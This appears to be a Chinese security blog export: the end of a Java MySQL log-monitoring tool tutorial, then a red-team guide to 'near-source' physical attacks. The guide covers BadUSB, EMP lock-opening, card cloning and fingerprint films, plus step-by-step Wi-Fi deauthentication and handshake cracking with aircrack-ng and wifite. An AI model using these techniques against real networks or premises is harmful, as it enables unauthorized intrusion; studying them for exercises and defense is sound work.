<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://localhost:3306/test_demo?useSSL=false&amp;allowPublicKeyRetrieval=true&amp;serverTimezone=UTC&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;password&quot;</span>);</span><br><span class="line">MySQL <span class="number">8.0</span> 以下版本 - JDBC 驱动名及数据库 URL   </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> String JDBC_DRIVER = <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>; </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> String DB_URL = <span class="string">&quot;jdbc:mysql://[localhost:3306/RUNOOB](http://localhost:3306/RUNOOB)&quot;</span>;</span><br><span class="line"><span class="comment">// MySQL 8.0 以上版本 - JDBC 驱动名及数据库 URL    </span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> String JDBC_DRIVER = <span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>; </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> String DB_URL = <span class="string">&quot;jdbc:mysql://[localhost:3306/RUNOOB?useSSL=false&amp;allowPublicKeyRetrieval=true&amp;serverTimezone=UTC](http://localhost:3306/RUNOOB?useSSL=false&amp;allowPublicKeyRetrieval=true&amp;serverTimezone=UTC)&quot;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> EventHandler&lt;ActionEvent&gt; <span class="title">Connect</span><span class="params">(String sql_addr, String sql_port, String sql_user,String sql_password)</span><span class="keyword">throws</span> ClassNotFoundException, SQLException  </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		USER = sql_user;</span><br><span class="line">		PASS = sql_password;</span><br><span class="line">		Connection conn = <span class="keyword">null</span>;</span><br><span class="line">        Statement stmt = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">        	JDBC_DRIVER = <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">        	DB_URL = <span class="string">&quot;jdbc:mysql://&quot;</span> + sql_addr + <span class="string">&quot;:&quot;</span> + sql_port + <span class="string">&quot;/mysql?useUnicode=true&amp;characterEncoding=utf8&amp;serverTimezone=GMT%2B8&amp;useSSL=false&quot;</span>;</span><br><span class="line">        	 <span class="comment">// 注册 JDBC 驱动</span></span><br><span class="line">            Class.forName(JDBC_DRIVER);</span><br><span class="line">            <span class="comment">// 打开链接</span></span><br><span class="line">            Database_listening.sql_date.appendText(time.format(Long.valueOf(System.currentTimeMillis()))+<span class="string">&quot;------正在连接数据库...&quot;</span>+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="comment">//            System.out.println(&quot;正在连接数据库...&quot;);</span></span><br><span class="line">            conn = DriverManager.getConnection(DB_URL,USER,PASS);</span><br><span class="line">            conn.prepareStatement(<span class="string">&quot;SET global general_log=on&quot;</span>).executeUpdate();</span><br><span class="line">            conn.prepareStatement(<span class="string">&quot;SET GLOBAL log_output=&#x27;table&#x27;&quot;</span>).executeUpdate();</span><br><span class="line">            DatabaseMetaData metaData = (DatabaseMetaData) conn.getMetaData();</span><br><span class="line">            String version = metaData.getDatabaseProductVersion();<span class="comment">//得到数据库版本信息</span></span><br><span class="line"><span class="comment">//            System.out.println(time.format(Long.valueOf(System.currentTimeMillis()))+&quot;--当前数据库版本为：&quot;+version);</span></span><br><span class="line">            Database_listening.sql_date.appendText(time.format(Long.valueOf(System.currentTimeMillis()))+<span class="string">&quot;------当前数据库版本为：&quot;</span>+version+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        &#125;<span class="keyword">catch</span>(SQLException se)&#123;</span><br><span class="line">        </span><br><span class="line">            JDBC_DRIVER = <span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;</span><br><span class="line">        	DB_URL = <span class="string">&quot;jdbc:mysql://&quot;</span>+sql_addr+<span class="string">&quot;:&quot;</span>+sql_port+<span class="string">&quot;/mysql?useUnicode=true&amp;characterEncoding=utf8&amp;serverTimezone=GMT%2B8&amp;useSSL=false&quot;</span>;</span><br><span class="line">        	 <span class="comment">// 注册 JDBC 驱动</span></span><br><span class="line">            Class.forName(JDBC_DRIVER);</span><br><span class="line">            <span class="comment">// 打开链接</span></span><br><span class="line"><span class="comment">//            System.out.println(&quot;正在连接数据库...&quot;);</span></span><br><span class="line">            Database_listening.sql_date.appendText(time.format(Long.valueOf(System.currentTimeMillis()))+<span class="string">&quot;------正在连接数据库...&quot;</span>+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            conn = DriverManager.getConnection(DB_URL,USER,PASS);</span><br><span class="line">            DatabaseMetaData metaData = (DatabaseMetaData) conn.getMetaData();</span><br><span class="line">            conn.prepareStatement(<span class="string">&quot;SET global general_log=on&quot;</span>).executeUpdate();</span><br><span class="line">            conn.prepareStatement(<span class="string">&quot;SET GLOBAL log_output=&#x27;table&#x27;&quot;</span>).executeUpdate();</span><br><span class="line">            String version = metaData.getDatabaseProductVersion();<span class="comment">//得到数据库版本信息</span></span><br><span class="line"><span class="comment">//            System.out.println(time.format(Long.valueOf(System.currentTimeMillis()))+&quot;--当前数据库版本为：&quot;+version);</span></span><br><span class="line">            Database_listening.sql_date.appendText(time.format(Long.valueOf(System.currentTimeMillis()))+<span class="string">&quot;------当前数据库版本为：&quot;</span>+version+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            <span class="comment">// 处理 Class.forName 错误</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-4-2监听数据库日志"><a href="#4-4-2监听数据库日志" class="headerlink" title="4.4.2监听数据库日志"></a>4.4.2监听数据库日志</h3><h4 id="监听思路"><a href="#监听思路" class="headerlink" title="监听思路"></a>监听思路</h4><p>刚开始想的是直接对某个数据库的日志进行监听，但是后面发现需要修改数据库的配置文件，不是很方便，毕竟不想每监听一个就去改一下这个数据库的配置文件(想偷懒),还有就是监听缓存文件以及监听mysql数据库里面的一个表，我想着之后有可能把它改成一个代码审计的工具，所以直接监听整mysql的日志，后面再对脏数据进行过滤就行了。</p>
<p>根据上面的思路，我直接对Mysql里的general_log表进行监听，但是后面发现有很多脏数据，而且因为这个是整个Mysql的所以那些数据库运行的数据也会显示出来，导致我后面过滤脏数据一度尴尬，为了验证可行性，直接用if去过滤那些无用的数据，后面改成黑名单，直接把那些脏数据加进去然后过滤了</p>
<h4 id="关键代码-1"><a href="#关键代码-1" class="headerlink" title="关键代码"></a>关键代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String logsql = <span class="string">&quot;select * from mysql.general_log where command_type =\&quot;Query\&quot; OR command_type =\&quot;Execute\&quot; order by event_time desc limit 1,15&quot;</span>;</span><br><span class="line">	Connection conn = DriverManager.getConnection(DB_URL, USER, PASS);</span><br><span class="line">	ResultSet rs = conn.prepareStatement(logsql).executeQuery();</span><br><span class="line"><span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">	String logres = rs.getString(<span class="string">&quot;argument&quot;</span>);</span><br><span class="line"><span class="comment">//System.out.println(time.format(Long.valueOf(System.currentTimeMillis()))+&quot;：&quot;+logres);</span></span><br><span class="line">	Database_listening.sql_date.appendText(time.format(Long.valueOf(System.currentTimeMillis()))+<span class="string">&quot;------&quot;</span>+logres+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>连接数据库，然后通过查询表内的数据，再不断输出，但是太多无用数据显示了，基本上每次都会显示SET NAMES utf8，SELECT @@session.autocommit，SHOW WARNINGS这些数据出来，太干扰看那些正常的语句了，所以我刚开始只是用了一层if去过滤这些数据，后面发现不大灵活，所以整成一个黑名单，可以动态添加删除拦截那些数据的规则。</p>
<h3 id="4-4-3过滤数据"><a href="#4-4-3过滤数据" class="headerlink" title="4.4.3过滤数据"></a>4.4.3过滤数据</h3><h4 id="过滤思路"><a href="#过滤思路" class="headerlink" title="过滤思路"></a>过滤思路</h4><p>刚开始获取的时候看到很多其他的数据来干扰，例如SELECT QUERY_ID，SHOW STATUS，SHOW FULL TABLES WHERE Table_type != ‘VIEW’这些，上面说到我用了个if去过滤那些带这个特征的数据，其实挺好用的，只不过后面想要动态的去调整这些黑名单，所以用了个下拉列表来存储数据，然后把数据过来只后再把下拉列表里面的数据进行处理，再把获取到的数据库信息一个个过滤掉，从而达到过滤的效果，</p>
<h4 id="关键代码-2"><a href="#关键代码-2" class="headerlink" title="关键代码"></a>关键代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!logres.equals(logsql) &amp;&amp; !logres.contains(<span class="string">&quot;/* mysql&quot;</span>) &amp;&amp; !logres.contains(<span class="string">&quot;SHOW WARNINGS&quot;</span>) &amp;&amp; !logres.contains(<span class="string">&quot;select event_time,argument from%%&quot;</span>) &amp;&amp; !logres.contains(<span class="string">&quot;SELECT STATE&quot;</span>) &amp;&amp; !logres.contains(<span class="string">&quot;SHOW STATUS&quot;</span>) &amp;&amp; !logres.contains(<span class="string">&quot;SELECT QUERY_ID&quot;</span>))&#123;</span><br><span class="line">     Database_listening.sql_date.appendText(time.format(Long.valueOf(System.currentTimeMillis()))+<span class="string">&quot;------&quot;</span>+logres+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到这基本上工具就写完了，这个算是比较简单的工具，开发思路也比较简单，也没用到什么奇奇怪怪的操作，基本上都是基础语法，挺适合小白上手工具开发的，</p>
<p>排版完面板之后把功能加入到各个按钮事件里面导出称jar文件，运行就可以用了，当然在编译器了也可以直接使用，看个人选择吧。</p>
<p><img src="https://ax-x.github.io/2022/01/20/%E5%AE%89%E5%85%A8%E5%B0%8F%E7%99%BD%E6%80%8E%E4%B9%88%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%8B%A5%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E6%AD%A6%E5%99%A8%E5%BA%93/image-20220106231423032-16414820643301.png" alt="image-20220106231423032"></p>
<h1 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h1><p>总的来说，开发工具其实没什么难度，把每一块拆分成多个小点去完成，然后拼接起来就行了，第一次写这种关于工具开发的文，有些可能没表达到位，我尽量把需要注意的地方给写出来，这个是针对于小白的，所以有些简单的东西还是选择说得仔细点，大佬们可以选择性的跳一跳，这个是第一篇，后面的话会根据自己平时开发的一些插件，工具啥的写一些开发思路或者教程，后面可能就不会讲面板这些东西了，如果有那里写得不对的，希望大佬们带带我。</p>
]]></content>
      <categories>
        <category>安全开发</category>
      </categories>
      <tags>
        <tag>安全工具</tag>
      </tags>
  </entry>
  <entry>
    <title>近源攻击方式总结</title>
    <url>/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前段时间身边的大佬去搞攻防，近源攻击挺有成效的，拿了上千的分数，之前自己也有搞过但是一直没用到攻防上面，整理下相关的方式，后续可以参考参考，近源攻击，顾名思义😏你走近点打他，攻击队通过靠近或者位于攻击目标内部，利用各类智能设备、通信技术、物理接口等方法进行突破，也就是说，攻防期间，除了待在小黑屋里面坐牢，还可以接近目标现场，通过现场的环境进行渗透突破，达到进入内网，获取数据的目的，比起在网上打点，近源攻击能够又快又准的进入目标内网，且方法多种多样，成功率很高，但是有点随缘，运气不好的话，可能你丢的Badusb被保洁阿姨丢掉了或者被保安抓了也不一定，关键还是运气和苟住🤔</p>
<span id="more"></span>
<h1 id="近源攻击方式-amp-amp-工具"><a href="#近源攻击方式-amp-amp-工具" class="headerlink" title="近源攻击方式&amp;&amp;工具"></a>近源攻击方式&amp;&amp;工具</h1><p>Badusb：利用HID，也就是计算机直接与人交互的设备，例如键盘、鼠标等进行攻击，将USB设备伪装使电脑识别为键盘，再利用USB设备中的微控制芯片，向主机发送命令，从而实现完全控制主机。</p>
<p>WIFI破解：通过使用外接无线网卡配合kali破解无线密码，现在一般是通过抓握手包然后通过跑包来破解，通过破解WiFi密码来连接目标网络，直接进入内网环境。</p>
<p>WIFI钓鱼：通过创建或者伪造wifi等待目标现场的工作人员进行连接，等工作人员连接上去之后通过分析数据包获取工作人员的上网信息或者内部wifi密码</p>
<p>电磁脉冲干扰（EMP干扰）：开锁利器，目前很多部门对于重要地点大多都是使用智能电子锁，不过当前电子设备和电路的工作频率不断提高，而工作电压却逐渐降低，因此对电磁脉冲（EMP）的敏感性和易损性也不断增加。同时，电子系统中的集成电路对电磁脉冲比较敏感，往往一个较大的电磁脉冲，就会使集成块产生误码、甚至电子元器件失效或烧毁，可以通过使用EMP干扰来打开部分电子门禁和电子密码锁。</p>
<p>变色龙（Chameleon Mini）：Chameleon Mini可以完全复制许多商业非接触式智能卡包括UID卡在内的全部内容，因此可以用来测试RFID和NFC设备在各种攻击环境下的安全性。</p>
<p>Proxmark 3：如果使用EMP无法打开门禁，还可以通过接近一下目标，找合适的机会破解IC卡或复制ID卡。对于ID卡，仅需不到一秒即可复制，而如果是存在MFOC漏洞的IC卡，需要十几秒钟时间复制，可谓攻敌利器。</p>
<p>纳米指纹膜：通过指纹拓印出一个跟原指纹一模一样的指纹膜，用于打开指纹锁或者手机锁屏等，看过谍战警匪片的大铁子们都知道的，拿了谁谁谁的指纹，然后现场畅通无阻😏不过搞不好就进去了，到时候还得要网安的人来捞人。</p>
<p>键盘记录器：能够针对外接的USB键盘，通过将键盘记录器放置到电脑和USB的之间，能够获取到用户在键盘上敲的数据。</p>
<p>光明正大(潜入)现场插网线：很好理解哈，就是偷跑到客户现场，把网线插到自己的电脑上，这样就能获取到内网的网络配置等信息，直接开始内网渗透，或者能够找到忘记锁或者没有账号密码，容易破解的主机也是一种办法，之前有师傅参加的攻防里头就用了这个，对于一些部门来说，管控没那么严格，你能进他的办公园区或者大楼，他们在里面逛了几圈，拿了几千分，缺点也很明显，容易被抓。</p>
<h1 id="相关方式实现过程"><a href="#相关方式实现过程" class="headerlink" title="相关方式实现过程"></a>相关方式实现过程</h1><h2 id="WIFI破解"><a href="#WIFI破解" class="headerlink" title="WIFI破解"></a>WIFI破解</h2><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">wifi破解有三种方式分别是：万能钥匙，字典破解，pin码爆破</span><br></pre></td></tr></table></figure>

<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>万能钥匙：类似于密码共享，当这个wifi环境下，有人刚好也使用了这个APP，并且把密码共享出去，那么当有人再次访问这个wifi的时候，APP会将密码发生给手机，如果服务器上不存在这个wifi的密码的时候，会尝试进行弱口令爆破，针对于一些公共场所，这个方法还有成功的可能，而对于一些政府部门，这个方法成功率为零。</p>
<p>字典破解：算是比较高级的方法，通过监听wifi的数据包 ，然后当有人连接wifi的时候，记录握手过程，然后通过字典进行对比，匹配出密码，当这个wifi已经有人连接的时候，没有办法抓到握手包，而现在的WiFi设备为了提供更好的用户体验都会再WiFi断线后尝试自动连接。在自动连接的过程中，手机等 设备会重新向路由器发送加密过后的WiFi密码，当路由器接收到这些信息后会将这些信息同自己内部存储的WiFi密码经过相同加密方式后的数据进行对比， 比对成功就算认证通过，那么可以尝试将已经连接的用户踢下线，让他重新连接，当被踢下线的用户重新连接就能进行监听抓包了。</p>
<p>pin码破解：pin其实依赖于路由的wps。就是只要你按一下WPS 按钮就能连接上WiFi的功能，省去了输密码的麻烦。这本来是个方便用户使用的功能，但是它其实是通过了pin码的方式进行了认证。Pin码认证通过后， 路由就会将密码以明文方式发送给你的网络设备，你的网络设备将自动记录和保存WiFi密码并连接上路由器。Pin码一共8位数，分前4和后4，路由先验证 前四位数是否正确，正确的话才会验证后四位，其实后4位的3位确定后，最后一位也就确定了，所以一共也就11000种可能。当然也不是说pin码就一定能百分比破解，如果关闭了wps功能或者路由器有防pin的功能，就很难进行破解，而且这种只针对老型号的路由器，新的路由器基本上都对pin爆破有防范了，而且有的都是默认关闭wps的。</p>
<h3 id="字典破解"><a href="#字典破解" class="headerlink" title="字典破解"></a>字典破解</h3><h4 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">支持监听的网卡（最好是8187或者3070的）</span><br><span class="line">kali</span><br></pre></td></tr></table></figure>

<h4 id="airodump-ng实现过程"><a href="#airodump-ng实现过程" class="headerlink" title="airodump-ng实现过程"></a>airodump-ng实现过程</h4><p>网卡插入物理机，然后连接到虚拟机上</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626170226021.png" alt="image-20220626170226021"></p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626170411962.png" alt="image-20220626170411962"></p>
<p>查看网卡是否接入成功，记住自己的网卡名，方便寻找</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta">#提升权限</span></span><br><span class="line">sudo su</span><br><span class="line"><span class="meta">#查看网卡</span></span><br><span class="line">airmon-ng</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626170613467.png" alt="image-20220626170613467"></p>
<p>如果没发现的话，看下VMware上的虚拟机里面的可移动设备是不是连接了网卡，如果不是连接一下，还不行的话看下自己买的网卡是不是支持kali或者是不是免驱的，这里注意一点就是，有些网卡虽然支持监听，但是不是免驱的，就有点麻烦，有些良心的会把驱动带上，直接安装就行了，有些是需要你自己去找驱动的，避免踩坑，网上帖子说的那种十几二十块的网卡，我是没买到过，我这个是50多（不知道有没有被坑），但是发射范围不大，只能作为实验或者说你去到人家楼下能够监听到网络的范围，不然的话可以买军工级别的，某鱼上面偶尔会有军工级别的放出来，用来钓鱼的话完全没问题，发射范围好几条街</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626170904261.png" alt="image-20220626170904261"></p>
<p>如果一切正常，检测到了网卡的存在，接着开启下网卡的监控，不开启的话是没办法进行监听的，有一些工具开启之后会帮你打开这个东西</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment">#开启网卡监控</span></span><br><span class="line"><span class="attribute">airmon</span>-ng start wlan<span class="number">0</span>（这个位置是根据的你interface名称来的）</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626223327574.png" alt="image-20220626223327574"></p>
<p>此时网卡名称变化，可以使用命令看看网卡的名字是否改变</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ifconfig</span></span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626223404634.png" alt="image-20220626223404634"></p>
<p>此时已经开启了网卡的监控，可以开始扫描现场存在的wifi了</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">airodump</span>-ng wlan<span class="number">0</span>mon（你网卡改变后的名字）</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626223538554.png" alt="image-20220626223538554"></p>
<p>这里停止监听，选择名为AX的wifi进行破解</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626224005071.png" alt="image-20220626224005071"></p>
<p>输入以下命令</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">airodump</span>-ng -w freedom -c <span class="number">1</span> --bssid <span class="number">48</span>:<span class="number">2</span>C:A<span class="number">0</span>:F<span class="number">2</span>:BF:D<span class="number">0</span> wlan<span class="number">0</span>mon -ignore-nefative-oneaa</span><br></pre></td></tr></table></figure>

<p>其中命令参数为</p>
<p>-c：指定信道<br>-w：指定抓去握手包的存放位置或者名字，freedom是一会抓去的握手包的名字<br>–bssid：指定路由器的MAC</p>
<p>需要更改两个参数，信道和地址，这两个参数分别是扫描wifi时确定要破解的wifi参数</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626224233602.png" alt="image-20220626224233602"></p>
<p>执行之后会到以下界面</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626224430849.png" alt="image-20220626224430849"></p>
<p>如果没连接的设备，就没办法接着往下的步骤了，所以这块还是比较看缘分的，从数据中看出有一台设备在连接，然后接着把这个用户踢下线，然后监听他重新连接的握手包，运行以下命令</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">aireplay</span>-ng -<span class="number">0</span> <span class="number">2</span> -a <span class="number">48</span>:<span class="number">2</span>C:A<span class="number">0</span>:F<span class="number">2</span>:BF:D<span class="number">0</span> -c <span class="number">0</span>A:FD:D<span class="number">4</span>:<span class="number">19</span>:<span class="number">1</span>A:<span class="number">04</span> wlan<span class="number">0</span>mon</span><br><span class="line"><span class="attribute">aireplay</span>-ng -<span class="number">0</span> <span class="number">2</span> -a （wifi的mac） -c （连接设备的mac） wlan<span class="number">0</span>mon</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626224907122.png" alt="image-20220626224907122"></p>
<p>执行成功后如上图，表明该客户机以及被成功的踢下线，我们要做的就是等待客户机重新连接，他只要重新连接了，我们就能抓到握手包，进行跑字典破解，这里我们模拟下重新连接这个wifi</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626225111090.png" alt="image-20220626225111090"></p>
<p>如果出现上面的数据，则证明我们监听到了握手包，可以接着进行爆破了，ctrl+c退出抓包，数据包保存在主目录下，名字为freedom-01.ivs的文件</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626225410953.png" alt="image-20220626225410953"></p>
<p>01是我之前测试的数据包，02是现在的，我们使用02的进行爆破，字典一定要够强大！！！执行以下命令</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">aircrack</span>-ng -w pass.txt freedom-<span class="number">02</span>.ivs</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626225813021.png" alt="image-20220626225813021"></p>
<p>爆破成功的话就跟上面一样，其实就跟网页爆破弱口令一样，看你自己的字典强度，到了这，我们就算进入对方网络环境了，可以开始扫描同网络环境下存在的主机了，如果不成功的话就是下面这种，平时多攒攒口令，关键时候口令能帮上大忙。</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626230044050.png" alt="image-20220626230044050"></p>
<h4 id="wifite实现过程"><a href="#wifite实现过程" class="headerlink" title="wifite实现过程"></a>wifite实现过程</h4><p>这个跟上面的airmon-ng是差不多的原理，都是监听-抓包-跑包对比字典的样子，这个会比较一体化，你只需要开启wifite然后选择自己想要监听爆破的wifi，他自己就会进行监听并且不断将已经连接的用户逼下线，通过让用户重新连接去抓取连接时的数据包，然后不断对比字典中的密码，你只需要保证你的字典足够强大就行了，算是很方便的了。</p>
<p>开启wifite，直接kali输入wifite就能启动然后开始监听（如果你插了网卡的话）</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220629154633466.png" alt="image-20220629154633466"></p>
<p>看上面报错了，提示缺了三个东西</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">[!] <span class="built_in">Warning</span>: Recommended app pyrit was <span class="keyword">not</span> <span class="built_in">found</span>. install @ https://github.com/JPaulMora/Pyrit/wiki</span><br><span class="line"> [!] <span class="built_in">Warning</span>: Recommended app hcxdumptool was <span class="keyword">not</span> <span class="built_in">found</span>. install @ apt install hcxdumptool</span><br><span class="line"> [!] <span class="built_in">Warning</span>: Recommended app hcxpcapngtool was <span class="keyword">not</span> <span class="built_in">found</span>. install @ apt install hcxtools</span><br></pre></td></tr></table></figure>

<p>这里需要把缺少的东西下载完</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">sudo apt install hcxdumptool </span><br><span class="line">apt install hcxtools</span><br><span class="line">sudo apt-<span class="built_in">get</span> install libpcap-dev sudo apt-<span class="built_in">get</span> install python2.<span class="number">7</span>-dev libssl-dev zlib1g-dev libpcap-dev </span><br><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/JPaulMora/Pyrit.git</span><br><span class="line"><span class="keyword">cd</span> Pyrit</span><br><span class="line">sudo <span class="keyword">python</span> setup.<span class="keyword">py</span> clean </span><br><span class="line">sudo <span class="keyword">python</span> setup.<span class="keyword">py</span> build </span><br><span class="line">sudo <span class="keyword">python</span> setup.<span class="keyword">py</span> install </span><br></pre></td></tr></table></figure>

<p>然后 就没提示缺少了，可以直接监听</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220629164002842.png" alt="image-20220629164002842"></p>
<p>出现你想要的WiFi之后，按ctrl+c停止监听，然后输入前面的序号，就可以开始爆破了</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220630094022818.png" alt="image-20220630094022818"></p>
<p>这里我们选择AX的wifi，然后开始捕获PMKID，是几年前比较新的一种用来破解无线密码的WPA/WPA2协议密码的方法，在之前的那些方法中，攻击者需要捕获用户连接路由器时的完整握手包。而新的方法可以在没有客户端的情况下，向AP发送请求来获取PMKID以用于破解，而且在研究员的文章中表示该攻击适用于所有支持并开启漫游功能（Roaming）的无线网络，具体不清楚到底会对多少路由器有效。</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220630094100830.png" alt="image-20220630094100830"></p>
<p>然后有大表哥研究过在实际情况下对周围环境的攻击能有多大的收获，最后在经过家庭环境和办公环境的对比之后得到这样的结论</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>.该攻击方式并没有明显降低攻击WPA/WPA<span class="number">2</span>网络的难度，依然需要字典式进行暴力破解，只是允许在无客户端情况下进行。</span><br><span class="line"><span class="attribute">2</span>.该攻击只对WPA-PSK/WPA<span class="number">2</span>-PSK有效，对企业级<span class="number">802</span>.<span class="number">1</span>X认证热点（WPA-Enterprise）无效。</span><br><span class="line"><span class="attribute">3</span>.大部分低端家用级路由器由于不支持漫游特性，对该攻击免疫；少部分中高端路由器（往往支持<span class="number">802</span>.<span class="number">11</span>AC）可能受影响，用不上就关掉吧（如果可以的话）。</span><br><span class="line"><span class="attribute">4</span>.对于用户：依然是提高无线密码复杂度，警惕热点密码分享APP。</span><br><span class="line"><span class="attribute">5</span>.对于路由器厂商：对WPA-PSK考虑是否有支持漫游特性的必要，或者增加开关。</span><br></pre></td></tr></table></figure>

<p>如果没捕获到PMKID，就会提示PMKID CAPTURE: Failed to capture PMKID，然后进行数据包的监听，当有用户连接进来的时候就会产生握手包，然后去跑字典。</p>
